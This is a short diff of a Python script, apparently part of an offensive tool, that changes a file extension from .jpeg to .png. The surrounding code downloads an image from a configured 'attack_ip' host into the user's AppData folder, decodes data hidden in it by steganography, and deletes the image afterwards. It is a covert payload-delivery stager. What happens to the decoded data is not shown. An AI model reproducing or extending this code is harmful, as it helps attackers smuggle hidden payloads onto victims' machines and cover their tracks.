@@ -9,7 +9,7 @@ user = os.getlogin()
 # get the current login user
 res = requests.get(f"http://{config.attack_ip}/dl/image", allow_redirects=True)
 
-open(f"C:\\Users\\{user}\\AppData\\Local\\image.jpeg", 'wb').write(res.content)
+open(f"C:\\Users\\{user}\\AppData\\Local\\image.png", 'wb').write(res.content)
 
 def to_bin(data):
     ''' convert 'data' to binary foramt as string
@@ -50,12 +50,12 @@ def decode(image_name):
     return decoded_data[:-5]
 
 
-output_image = f"C:\\Users\\{user}\\AppData\\Local\\image.jpeg"
+output_image = f"C:\\Users\\{user}\\AppData\\Local\\image.png"
 
 decoded_data = decode(output_image)
 
 try:
-    os.remove(f"C:\\Users\\{user}\\AppData\\Local\\image.jpeg")
+    os.remove(f"C:\\Users\\{user}\\AppData\\Local\\image.png")
 except:
     pass
 
